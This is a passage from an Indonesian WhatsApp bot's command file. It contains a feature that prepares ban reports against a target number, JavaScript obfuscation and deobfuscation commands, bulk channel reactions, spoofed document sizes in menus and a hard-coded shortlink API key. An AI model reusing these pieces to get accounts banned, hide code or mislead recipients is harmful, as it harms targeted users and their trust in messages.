Saya ingin melaporkan akun WhatsApp dengan nomor: +${nomorTarget}

📝 Alasan:
${alasan}

Mohon ditinjau karena saya merasa akun tersebut melanggar kebijakan WhatsApp.

Dikirim oleh: +${pelapor}
    `.trim();

    global.lastBanReport = templateReport;

    return ZakzzDev.sendMessage(m.chat, {
        text: `
🚨 *Siap Kirim Laporan!*

📌 *Target:* +${nomorTarget}  
📝 *Alasan:* ${alasan}

───── ⬇️ *Tindakan yang Bisa Dilakukan* ⬇️ ─────

📧 Klik tombol "Kirim Laporan" untuk langsung ajukan ke WhatsApp via Gmail.

📄 Atau klik "Copy Template" untuk salin isi email secara manual.
        `.trim(),
        footer: "WhatsApp Abuse Report by AlwaysZakzz",
        buttons: [
            { buttonId: mailto, buttonText: { displayText: "📧 Kirim Laporan" }, type: 1 },
            { buttonId: ".templatebanned", buttonText: { displayText: "📄 Copy Template" }, type: 1 },
            { buttonId: ".batalbanned", buttonText: { displayText: "❌ Batal" }, type: 1 }
        ],
        headerType: 1
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "templatebanned": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");
    if (!global.lastBanReport) return m.reply("❗ Belum ada laporan disiapkan. Ketik `.bannedwa [nomor] [alasan]` dulu.");

    m.reply(global.lastBanReport);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "batalbanned": {
    if (!isCreator) return m.reply("❌ Perintah ini hanya untuk *Owner/Creator Bot*.");
    
    global.lastBanReport = null;
    m.reply("❌ Permintaan laporan dibatalkan.");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/AlwaysZakzz-Dev/ZakzzV9"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ZakzzDev.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await ZakzzDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: ZakzzDev.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Succes Download video Tiktok✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await ZakzzDev.sendMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await ZakzzDev.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await ZakzzDev.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "enc": case "encrypt": {
  if (!isCreator) return m.reply(mess.owner)
  if (!m.quoted) return m.reply(example("Reply file .js untuk di-encrypt"))
  if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Harap reply file *.js*")

  try {
    // Ambil file yang direply
    const media = await m.quoted.download()
    const filename = m.quoted.message.documentMessage.fileName
    const tmpPath = `./tmp/${Date.now()}_${filename}`

    // Simpan sementara
    await fs.promises.writeFile(tmpPath, media)

    const source = await fs.promises.readFile(tmpPath, 'utf8')
    await m.reply("🚀 Proses encrypt .js mulai...")

    const obf = await JsConfuser.obfuscate(source, {
      target: "node",
      preset: "high",
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: "randomized",
      minify: true,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      shuffle: { hash: 0.5, true: 0.5 },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false
    })

    // Simpan hasil dan kirim
    const out = obf.toString()
    await fs.promises.writeFile(tmpPath, out)
    await ZakzzDev.sendMessage(m.chat, {
      document: fs.readFileSync(tmpPath),
      mimetype: "application/javascript",
      fileName: filename,
      caption: "🔒 Encrypt file .js sukses!"
    }, { quoted: m })

    // Hapus berkas sementara
    await fs.promises.unlink(tmpPath)
  } catch (e) {
    console.error(e)
    m.reply("❗ Terjadi error saat proses encrypt:\n" + e.message)
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*ZakzzDev/*^/*($break)*/" + 
            "/*ZakzzDev/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await ZakzzDev.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "crackenc": case "bobol": {
    if (!isCreator) return m.reply('Khusus creator!');

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mtype || '';
    if (!/javascript|x-javascript/.test(mime)) {
        return m.reply('!!Balas file `.js` yang ingin di-crack!');
    }

    m.reply('⏳ Memproses file...');

    try {
        const beautify = require('js-beautify').js;
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

        const stream = await downloadContentFromMessage(q.msg || q, 'document');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let code = buffer.toString();
        let decoded = false;

        const isBase64 = /Buffer\.from\(['"`][A-Za-z0-9+/=]+['"`],?\s*['"`]?base64['"`]?\)/.test(code);
        if (isBase64) {
            const b64Match = code.match(/Buffer\.from\(['"`]([A-Za-z0-9+/=]+)['"`],?\s*['"`]?base64['"`]?\)/);
            if (b64Match) {
                code = Buffer.from(b64Match[1], 'base64').toString('utf-8');
                decoded = true;
            }
        }

        const isEscape = /eval\(unescape\(/.test(code);
        if (isEscape) {
            const escapeMatch = code.match(/unescape\(['"`](.*?)['"`]\)/);
            if (escapeMatch) {
                code = unescape(escapeMatch[1]);
                decoded = true;
            }
        }

        const isEval = /eval\(function\(p,a,c,k,e,d\)/.test(code);
        if (isEval) {
            try {
                const jsunpack = require('./library/ZakzzIsNotDev');
                const unpacked = jsunpack.unpack(code);
                if (unpacked) {
                    code = unpacked;
                    decoded = true;
                }
            } catch (err) {
                console.log('❌ Modul unpack tidak ditemukan atau error.');
            }
        }

        if (!decoded) {
            m.reply('⚠️ File tidak terdeteksi terenkripsi / tidak perlu crack.');
        }

        const beautified = beautify(code);

        await ZakzzDev.sendMessage(m.chat, {
            text: `📜 *Hasil Crack*\n\n\`\`\`javascript\n${beautified}\n\`\`\``
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply('❌ Gagal men-crack file. Format mungkin tidak dikenali.');
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listfitur": {
    const code = fs.readFileSync(__filename, 'utf-8');
    const listCommand = [...code.matchAll(/case ['"`](.+?)['"`]:/g)].map(m => `⤷ *.${m[1]}*`).join('\n');

    const total = listCommand.split('\n').length;
    const teks = `
╭───⧁ *ALWAYSZAKZZ BOT FEATURE LIST* ⧁───╮

${listCommand}

╰─────────────⧁────⧁─────────────╯
⎇ Total Fitur Terdeteksi : *${total}*
⎇ Dibaca langsung dari *source code utama*
⎇ Versi Bot: *v9.0* | Creator: *AlwaysZakzz*
    `.trim();

    return m.reply(teks);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await ZakzzDev.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await ZakzzDev.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
ZakzzDev.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${namaOwner}`,  sourceUrl: global.linkSaluran, previewType: "PHOTO"}}}, {quoted: qtext})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await ZakzzDev.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await ZakzzDev.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await ZakzzDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: ZakzzDev.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await ZakzzDev.sendMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "gimage": {
if (!text) return m.reply(example("logo whatsapp"))
await ZakzzDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://aanz-official.my.id/api/search/gimage?q=${text}`)
if (!res.status) return m.reply("Error")
let total = 0
let aray
if (res.result.length < 5) {
aray = res.result
} else {
aray = res.result.slice(0, 5)
}
for (let i of aray) {
await ZakzzDev.sendMessage(m.chat, {image: {url: i.url}, caption: `Hasil pencarian foto ke ${total += 1}`}, {quoted: m})
}
await ZakzzDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://aanz-official.my.id/ai/openai?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'brat': {
  let teks = ''

  if (m.quoted && m.quoted.text) {
    teks = m.quoted.text
  } else if (text) {
    teks = text
  } else {
    return m.reply('❌ Harap reply atau masukkan teks.')
  }

  try {
    await m.reply('Tunggu sebentar kak 🕒')

    const response = `https://api.nekorinn.my.id/maker/brat-v2?text=${encodeURIComponent(teks)}`

    await ZakzzDev.sendAsSticker(m.chat, response, m, {
      packname: 'AlwaysZakzz',
      author: 'By AlwaysZakzz'
    })
  } catch (e) {
    console.error(e)
    m.reply(`❌ Terjadi kesalahan!\n${e}`)
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'bratvid': case 'bratvideo': {
  await pelliv('🎬')
  if (!text) return formatsalah(example('halo'))
  if (text.length > 250) return m.reply('Karakter terbatas, maksimal 250!')

  const words = text.split(" ")
  const tempDir = path.join(__dirname, 'library/database/sampah')
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true })
  const framePaths = []

  try {
    // Ambil frame satu per satu sebagai gambar
    for (let i = 0; i < words.length; i++) {
      const currentText = words.slice(0, i + 1).join(" ")
      const res = await axios.get(`https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
        responseType: "arraybuffer"
      })

      const framePath = path.join(tempDir, `frame${i}.png`)
      fs.writeFileSync(framePath, res.data)
      framePaths.push(framePath)
    }

    // Buat filelist untuk ffmpeg
    const fileListPath = path.join(tempDir, "filelist.txt")
    let fileListContent = framePaths.map(f => `file '${f}'\nduration 0.3`).join('\n')
    fileListContent += `\nfile '${framePaths[framePaths.length - 1]}'\nduration 1.5`
    fs.writeFileSync(fileListPath, fileListContent)

    // Proses ke .webp animasi
    const outputWebpPath = path.join(tempDir, "output.webp")
    execSync(
      `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=15,scale=512:-1:flags=lanczos" -loop 0 -an -vsync 0 ${outputWebpPath}`
    )

    await ZakzzDev.sendMessage(m.chat, {
      sticker: fs.readFileSync(outputWebpPath)
    }, { quoted: m })

    // Bersihkan
    framePaths.forEach(f => fs.existsSync(f) && fs.unlinkSync(f))
    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
    if (fs.existsSync(outputWebpPath)) fs.unlinkSync(outputWebpPath)

  } catch (err) {
    console.error(err)
    m.reply('❌ Terjadi kesalahan saat membuat stiker animasi.')
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//


case "reactch": case "rch": {
    if (!isOwner) return m.reply(msg.owner);
    if (!text) return m.reply("Contoh:\n.reactch https://whatsapp.com/channel/zzzz/002 AlwaysZakzz\n.reactch https://whatsapp.com/channel/zzzz/002 AlwaysZakzz|5");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const [mainText, offsetStr] = text.split('|');
    const args = mainText.trim().split(" ");
    const link = args[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return m.reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan AlwaysZakzz|5");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return m.reply("Link tidak lengkap!");
    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = args.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();
    if (!teksTanpaLink) return m.reply("Masukkan teks/emoji untuk direaksikan.");
    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const metadata = await ZakzzDev.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await ZakzzDev.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        m.reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
    } catch (err) {
        console.error(err);
        m.reply("❌ Gagal memproses permintaan!");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await ZakzzDev.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await ZakzzDev.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekgempa": {
  if (!m.isGroup) m.reply("Mengambil data gempa dari BMKG...")

  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json")
    const json = await res.json()
    if (!json?.Infogempa?.gempa) return m.reply("Gagal mengambil data gempa.")

    const g = json.Infogempa.gempa
    const teks = `⧁ ɪɴғᴏ ɢᴇᴍᴘᴀ ᴛᴇʀᴋɪɴɪ ⧁\n\n` +
                 `⨠ ᴛᴀɴɢɢᴀʟ: ${g.Tanggal}\n` +
                 `⨠ ᴡᴀᴋᴛᴜ: ${g.Jam}\n` +
                 `⨠ ᴍᴀɢɴɪᴛᴜᴅᴏ: ${g.Magnitude}\n` +
                 `⨠ ᴋᴇᴅᴀʟᴀᴍᴀɴ: ${g.Kedalaman}\n` +
                 `⨠ ʟᴏᴋᴀꜱɪ: ${g.Wilayah}\n` +
                 `⨠ ᴋᴏᴏʀᴅɪɴᴀᴛ: ${g.Lintang} ${g.Bujur}\n` +
                 `⨠ ᴘᴏᴛᴇɴꜱɪ: ${g.Potensi}\n` +
                 `⨠ ᴅɪʀᴀꜱᴀᴋᴀɴ: ${g.Dirasakan || '-' }\n\n` +
                 `⨢ Sumber: BMKG — https://www.bmkg.go.id/`

    if (g.Shakemap) {
      const img = `https://data.bmkg.go.id/DataMKG/TEWS/${g.Shakemap}`
      await ZakzzDev.sendMessage(m.chat, {
        image: { url: img },
        caption: teks
      }, { quoted: m })
    } else {
      await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: m })
    }

  } catch (err) {
    console.log(err)
    m.reply("Terjadi kesalahan saat mengambil data.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cektsunami": {
  if (!m.isGroup) m.reply("Mengambil peringatan tsunami dari BMKG...")

  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/tautsunami.json")
    const json = await res.json()
    if (!json?.Infotsunami?.gempa) return m.reply("Tidak ada peringatan tsunami saat ini.")

    const g = json.Infotsunami.gempa
    const teks = `⧁ ɪɴғᴏ ᴘᴇʀɪɴɢᴀᴛᴀɴ ᴛꜱᴜɴᴀᴍɪ ⧁\n\n` +
                 `⨠ ᴛᴀɴɢɢᴀʟ: ${g.Tanggal}\n` +
                 `⨠ ᴡᴀᴋᴛᴜ: ${g.Jam}\n` +
                 `⨠ ᴍᴀɢɴɪᴛᴜᴅᴏ: ${g.Magnitude}\n` +
                 `⨠ ᴋᴇᴅᴀʟᴀᴍᴀɴ: ${g.Kedalaman}\n` +
                 `⨠ ʟᴏᴋᴀꜱɪ: ${g.Wilayah}\n` +
                 `⨠ ᴘᴏᴛᴇɴꜱɪ: ${g.Potensi}\n` +
                 `⨠ ᴛꜱᴜɴᴀᴍɪ: ${g.Peringatan || '-' }\n\n` +
                 `⨢ Sumber: BMKG — https://www.bmkg.go.id/`

    await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: m })
  } catch (err) {
    console.log(err)
    m.reply("Terjadi kesalahan saat mengambil data tsunami.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "bmkg": {
  const layananRows = [
    { title: "📈 Info Gempa Terkini", id: ".cekgempa" },
    { title: "🌊 Info Peringatan Tsunami", id: ".cektsunami" }
  ]

  let teks = `
📡 Silakan pilih informasi yang ingin kamu lihat:
━━━━━━━━━━━━━━━━
ぃ .cekgempa 
ぃ .cektsunami 
`;

  await ZakzzDev.sendMessage(m.chat, {
    footer: `⨢ Sumber: BMKG — www.bmkg.go.id`,
    buttons: [{
      buttonId: 'pilih',
      buttonText: { displayText: 'Pilih Info BMKG' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'ɪɴғᴏʀᴍᴀsɪ ʙᴍᴋɢ',
          sections: [{
            title: 'ᴘɪʟɪʜ ᴋᴀᴛᴇɢᴏʀɪ',
            highlight_label: 'ʟɪᴠᴇ ᴅᴀᴛᴀ',
            rows: layananRows
          }]
        })
      }
    }],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `✪ 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 ✪`,
    mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    fileLength: 99999999,
    caption: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
      externalAdReply: {
        title: `${botname}`,
        body: `📡 Info Resmi dari BMKG`,
        mediaType: 1,
        thumbnailUrl: 'https://www.bmkg.go.id/asset/img/logo/logo-bmkg.png',
        sourceUrl: 'https://www.bmkg.go.id/',
        renderLargerThumbnail: false
      }
    }
  })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "game": {
  const gameRows = [
    { title: "🔤 Tebak Kata", id: ".tebakkata" },
    { title: "🎭 Tebak Emoji", id: ".tebakemoji" },
    { title: "✂️ Suit (Gunting Batu Kertas)", id: ".suit gunting" },
    { title: "🎲 Tebak Angka Dadu", id: ".dadu" },
    { title: "🎧 Tebak Judul Lagu", id: ".tebaklirik" }
  ]

  let teks = `
🎮 Pilih salah satu game untuk dimainkan:
━━━━━━━━━━━━━━━━
ぃ .tebakkata
ぃ .tebakemoji
ぃ .suit gunting
ぃ .dadu
ぃ .tebaklirik
  `

  await ZakzzDev.sendMessage(m.chat, {
    footer: `⨢ Game Ringan Seru - Cocok untuk Chat Santai`,
    buttons: [{
      buttonId: 'mainkan',
      buttonText: { displayText: 'Pilih Game 🎮' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'ɢᴀᴍᴇ ᴍᴇɴᴜ',
          sections: [{
            title: 'ᴘɪʟɪʜ ɢᴀᴍᴇ ʏᴀɴɢ ᴀᴋᴀɴ ᴅɪᴍᴀɪɴᴋᴀɴ',
            highlight_label: 'ʟɪᴠᴇ ɢᴀᴍᴇ',
            rows: gameRows
          }]
        })
      }
    }],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `✪ 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 ✪`,
    mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    fileLength: 99999999,
    caption: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
      externalAdReply: {
        title: `${botname}`,
        body: `🎮 Game Ringan dan Seru`,
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/k4owwk.jpg',
        sourceUrl: 'https://github.com', // bisa ganti ke link bot kamu
        renderLargerThumbnail: false
      }
    }
  })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tebakkata": {
  const kata = ["pelangi", "komputer", "gajah", "sepeda", "televisi"]
  const dipilih = kata[Math.floor(Math.random() * kata.length)]
  const acak = dipilih.split('').sort(() => Math.random() - 0.5).join('')

  ZakzzDev.tebakkata = ZakzzDev.tebakkata || {}
  ZakzzDev.tebakkata[m.sender] = dipilih

  m.reply(`🔤 Tebak Kata:\n\n${acak.toUpperCase()}\n\nKetik jawabanmu!`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tebakemoji": {
  const data = [
    { soal: "👨‍🍳🍳🔥", jawaban: "masak" },
